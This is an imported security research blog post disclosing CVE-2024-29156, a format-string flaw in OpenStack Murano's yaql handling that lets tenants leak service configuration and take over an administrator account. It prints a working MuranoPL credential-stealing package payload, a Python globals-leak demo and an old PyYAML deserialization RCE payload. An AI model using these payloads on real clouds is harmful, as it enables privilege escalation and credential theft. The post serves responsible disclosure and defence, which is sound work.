---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-03-21_openstack-admin-account-takeover-due-to-unsafe-environment-handling-in-muranopl.md
original_filename: 2024-03-21_openstack-admin-account-takeover-due-to-unsafe-environment-handling-in-muranopl.md
title: OpenStack Admin Account Takeover due to Unsafe Environment Handling in MuranoPL
category: documents
detected_topics:
- supply-chain
- command-injection
- automation-abuse
tags:
- imported
- documents
- supply-chain
- command-injection
- automation-abuse
language: en
raw_sha256: 69401fcc86f3e7d88dc3656616d9bcff8d20f4ff00b2ec6b2dc391b03b11418d
text_sha256: 465110e8b5c9d48686c0834f4f9f588423842f9d4a29b4d29581f0b0a197b629
ingested_at: '2026-06-28T07:32:32Z'
sensitivity: unknown
redactions_applied: true
---

# OpenStack Admin Account Takeover due to Unsafe Environment Handling in MuranoPL

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-03-21_openstack-admin-account-takeover-due-to-unsafe-environment-handling-in-muranopl.md
- Source Type: markdown
- Detected Topics: supply-chain, command-injection, automation-abuse
- Ingested At: 2026-06-28T07:32:32Z
- Redactions Applied: True
- Raw SHA256: `69401fcc86f3e7d88dc3656616d9bcff8d20f4ff00b2ec6b2dc391b03b11418d`
- Text SHA256: `465110e8b5c9d48686c0834f4f9f588423842f9d4a29b4d29581f0b0a197b629`


## Content

---
title: "OpenStack Admin Account Takeover due to Unsafe Environment Handling in MuranoPL"
page_title: "Openstack Admin Account Takeover due to Unsafe Environment Handling in Mura"
url: "https://sites.google.com/site/zhiniangpeng/blogs/Openstack"
final_url: "https://sites.google.com/site/zhiniangpeng/blogs/Openstack"
authors: ["zhiniang peng (@edwardzpeng)"]
programs: ["Openstack"]
bugs: ["Account takeover", "Cloud"]
publication_date: "2024-03-21"
added_date: "2024-08-06"
source: "pentester.land/writeups.json"
original_index: 367
---

Search this site

Embedded Files

Skip to main content

Skip to navigation

  * [Home](/site/zhiniangpeng/home)

  * [Talks](/site/zhiniangpeng/Talk)

  * [Blogs](/site/zhiniangpeng/blogs)

  * [Research](/site/zhiniangpeng/Research)

  * [Work Experience](/site/zhiniangpeng/works)

  * [Education](/site/zhiniangpeng/showcase)

  * [CVEs](/site/zhiniangpeng/cves)

  * [Home](/site/zhiniangpeng/home)

  * [Talks](/site/zhiniangpeng/Talk)

  * [Blogs](/site/zhiniangpeng/blogs)

  * [Research](/site/zhiniangpeng/Research)

  * [Work Experience](/site/zhiniangpeng/works)

  * [Education](/site/zhiniangpeng/showcase)

  * [CVEs](/site/zhiniangpeng/cves)

  * More

  * [Home](/site/zhiniangpeng/home)

  * [Talks](/site/zhiniangpeng/Talk)

  * [Blogs](/site/zhiniangpeng/blogs)

  * [Research](/site/zhiniangpeng/Research)

  * [Work Experience](/site/zhiniangpeng/works)

  * [Education](/site/zhiniangpeng/showcase)

  * [CVEs](/site/zhiniangpeng/cves)

# OpenStack Admin Account Takeover due to Unsafe Environment Handling in MuranoPL

# Introduction

  

OpenStack is an open-source cloud computing platform used to build and manage public and private clouds. It offers infrastructure services like compute, storage, and networking, supporting various virtualization technologies, flexible and scalable. They say on offical website: "The Most Widely Deployed Open Source Cloud Software in the World", and seem have a lot of use-cases: https://www.openstack.org/use-cases/

  

As for `Murano` is an application catalog service designed to simplify the process of deploying application services on OpenStack. The basic functionality is the Murano service parses and executes deployment code file written in `MuranoPL` (short for Murano Program Language) contained within the user-uploaded app package to complete the deployment operation.

  

Based on our experience with this kind of project, any operation involving the parsing and execution of code, templates, or data may pose security risks. After some research, we successfully identified a vulnerability in the default deployment configuration, could leak sensitive platform information, allowing tenants to elevate their permissions to administrator. We have discovered multiple instances of public and private clouds based on OpenStack that are affected by this vulnerability. 

  

**CVE-2024-29156** : [https://wiki.openstack.org/wiki/OSSN/OSSN-0093](https://wiki.openstack.org/wiki/OSSN/OSSN-0093)

  

# Architecture

  

Various information about Murano can be found in the official documentation, such as its architecture diagram: [Murano Architecture](https://docs.openstack.org/murano/latest/reference/architecture.html).

  

Murano consists of several modules, and user-uploaded app packages will finally reach `murano-engine` for parsing and execution. An app package is essentially a zip archive with the following directory structure and functionality:

  

- **manifest.yaml**: Describes information about the application to be deployed and which resource files are included.

- **Classes/\\*.yaml**: Written in `MuranoPL`, describes the operations to schedule resources to complete application deployment.

- **UI/\\*.yaml**: Also written in `MuranoPL`, constructs the user interaction interface during deployment.

- **Resources/\\***: Contains custom resource files.

  

# CVE-2016-4972

  

Here is a old CVE for `MuranoPL`. https://nvd.nist.gov/vuln/detail/CVE-2016-4972

  

It's a classic YAML deserialization vulnerability that allowed for direct RCE. This vulnerability exploit the `yaml.load` function of the `PyYAML` library (before the release of `PyYAML 5.1`), where users had full control over the content of the YAML file. Typically, a payload like the following could achieve RCE:

  

'''yaml

!!python/object/apply:subprocess.Popen [whoami]

'''

The vulnerability was fixed by using the `SafeLoader` loader, which does not support deserialization of class objects. The fix is simple but effective: [Fix Patch](https://review.opendev.org/c/openstack/murano/+/333425).

  

# MuranoPL

  

## Language Features

  

Let's introduce the `MuranoPL` language, which can be considered an extension of `yaql`, we found that, compared to YAQL, it includes the following additional features:

  

### New Syntax Structures

  

**Looping, Conditional Keywords**

'''python

# murano/dsl/macros.py

expressions.register_macro(WhileDoMacro)

...

expressions.register_macro(IfMacro)

'''

  

**Class Definition and Inheritance**

'''python

# murano/dsl/murano_type.py

class MuranoClass(dsl_types.MuranoClass, MuranoType, dslmeta.MetaProvider):

...

def extension_class(self):

...

def add_property(self, property_typespec):

...

def add_method(self, name, payload, original_name=None):

...

'''

  

**Function and Method Definition**

'''python

# murano/dsl/murano_method.py

class MuranoMethod(dsl_types.MuranoMethod, meta.MetaProvider):

...

def invoke(self, this, args, kwargs, context=None, skip_stub=False):

'''

  

### More Functions, Expressions, and Classes

  

**Additional Function and Expression Support**

'''python

# murano/dsl/yaql_functions.py

def register(context, runtime_version):

context.register_function(cast)

...

context.register_function(ns_resolve_unary)

'''

  

**Registering Various Classes**

'''python

# murano/engine/system/system_objects.py

def register(package):

...

package.register_class(agent_listener.AgentListener)

...

package.register_class(project.Project)

'''

  

## Example of MuranoPL Code

  

An example of MuranoPL code is as follows:

  

https://github.com/openstack/murano-apps/blob/master/MySQL/package/Classes/MySql.yaml

  

'''yaml

Namespaces:

=: com.example.databases

std: io.murano

res: io.murano.resources

sys: io.murano.system

conf: io.murano.configuration

  

Name: MySql

  

Extends:

- std:Application

  

Properties:

instance:

Contract: $.class(res:Instance).notNull()

  

Methods:

.init:

Body:

- $._environment: $.find(std:Environment).require()

  

deploy:

Body:

- If: not $.getAttr(deployed, false)

Then:

- $._environment.reporter.report($this, 'Creating VM for MySql')

- $securityGroupIngress:

- ToPort: 3306

FromPort: 3306

IpProtocol: tcp

External: true

- $._environment.securityGroupManager.addGroupIngress($securityGroupIngress)

- $.instance.deploy()

# Deploy MySql

- $._environment.reporter.report($this, 'Instance is created. Deploying MySql')

- $file: sys:Resources.string('deployMySql.sh')

- conf:Linux.runCommand($.instance.agent, $file)

...

'''

  

# Exploitation

  

After the above introduction, we have gained some understanding of `MuranoPL`. Now let's begin analyzing the vulnerability. The fundamental cause of the vulnerability lies in the `yaql` library.

  

`yaql` natively supports some functions, including the `format` function, which is a built-in string formatting function defined as follows:

  

'''python

@specs.parameter('__format_string', yaqltypes.String())

@specs.extension_method

def format_(__format_string, *args, **kwargs):

return __format_string.format(*args, **kwargs)

'''

  

The formatting string parameters and formatted parameters are both user-controllable. The Python formatting print function `str.format` has a feature that allows accessing attributes of the formated parameter object: [string — Common string operations — Python 3.12.2 documentation](https://docs.python.org/3/library/string.html#formatstrings). Therefore, we can attempt to use this feature to leak the underlying data structure of `MuranoPL`.

  

So, the vulnerability can be exploited by accessing attributes of formatted parameter objects, similar to the sandbox escape idea commonly used in Python. For example:

  

'''python

secret_key=***REDACTED***

class Test:

def __init__(self):

pass

  

t = Test()

# Exploiting the vulnerability to expose sensitive data:

evil_format_string = '{0.__class__.__init__.__globals__[secret_key]}'

formatted_output = evil_format_string.format(t)

# This line reveals the value of secret_key

print(formatted_output)

'''

  

This code successfully leaks the value of the `secret_key`.

  

Next, we attempt to leak the environment information of the `Murano` service. The configuration information of Murano is mainly loaded through `oslo_config`. An example usage of `oslo_config` is as follows:

  

'''python

from oslo_config import cfg

CFG = cfg.CONF

config_val = CFG[section][config_key]

'''

  

Therefore, if we can obtain the `CFG` object, we can access all the configuration information loaded by `oslo_config`.

  

After investigation and experimentation, it was confirmed that configuration leakage could be achieved through the following class:

  

**meta/io.murano/Classes/Environment.yaml**

  

'''python

Namespaces:

=: io.murano

...

# define `Environment` class via MuranoPL

Name: Environment

...

Properties:

...

reporter:

Contract: $.class(sys:StatusReporter)

Usage: Runtime

'''

  

`Environment` is a `MuranoPL` class defined in a YAML file. Among its defined properties is the `reporter` attribute of the `StatusReporter` class. By examining the python code definition of `StatusReporter`, we can see that the `oslo_config` module is imported, which is exactly what we want.

  

**murano/engine/system/status_reporter.py**

  

'''python

from oslo_config import cfg

...

# this is what we want

CONF = cfg.CONF

...

# define `StatusReporter` class that can be used in MuranoPL

@dsl.name('io.murano.system.StatusReporter')

class StatusReporter(object):

...

'''

  

Native Python objects are set to the `_extension` attribute of `MuranoObject`, from which we can obtain the Python object of `StatusReporter`.

  

Finally, the key payload for leaking information is as follows:

  

'''yaml

Namespaces:

=: com.test

std: io.murano

  

Name: OSLO_CONFIG_STEALER

  

Extends:

- std:Application

  

Methods:

.init:

Body:

- $._environment: $.find(std:Environment).require()

  

deploy:

Body:

- $._environment.reporter.report($this, 'Try leaking oslo configuration')

- $._environment.reporter.report($this, format('{0._extension.__init__.__globals__[CONF].__dict__}', $._environment.reporter))

'''

  

By packaging the app in this format, uploading and deploying it, we can see leaked information in the deployment logs.

![](https://lh3.googleusercontent.com/sitesv/AA5AbUAmrf5RKDODcTiKJr5_uj0ed6qwES5CsmCm2KfkX0WGmrDzdKVP7_M8EDAHVZ6Kc5TdD9hmFxAhmpogD770S6TOwYaAzYDY_GaarTCod1neJ74uNcPw74NiFc4STw82mhjJ44XJ8KSFIdie8a8zIE6vexvYc2C7BLXnm3RFZOib0v7FgCyjgNHyQLLd5dMyJnHoQdJzXrH72oCna8_Fd3LehUQtvzEvb4XSvljq0yw=w1280)

This includes sensitive information, such as the account of the Murano service in Keystone (an identity authentication management service for OpenStack), and this account is in the administrator group, allowing tenants to login with this account and elevate their permissions to administrator.

  

# Impact

We have discovered multiple instances of public and private clouds based on OpenStack that are affected by this vulnerability. Tenants can gain administrator privileges in these clouds.

  

Apart from Murano service, yaql is also referenced by other projects. Currently, it is understood that OpenStack's `heat` and `mistral` also reference this project. OpenStack's VMT(vulnerability management team) has notified relevant project participants to confirm whether they are affected.

  

To handle this vulnerability, OpenStack VMT's suggestion is: Disable the Murano service, or fully remove it from, all OpenStack deployments at the earliest opportunity.

  

# Timeline

  

Our first submission was on January 4th, with an inquiry in between. Finally, the Murano project team officially engaged and confirmed the issue on February 20th. The OpenStack VMT explained: "There was a bit of a leadership crisis for Murano, and nobody in the existing group authorized to see this report was around to look into the issue you reported". This might pose a risk to open-source project security, as outdated and unmaintained projects may not receive formal notifications, and security issues may not be adequately addressed.

  

However CVE-2024-29156 was ultimately resolved with the involvement of OpenStack VMT and related personnel.

  

# Credits

  

kirualawliet and Zhiniang Peng (@edwardzpeng)

  

Google Sites

Report abuse

Google Sites

Report abuse
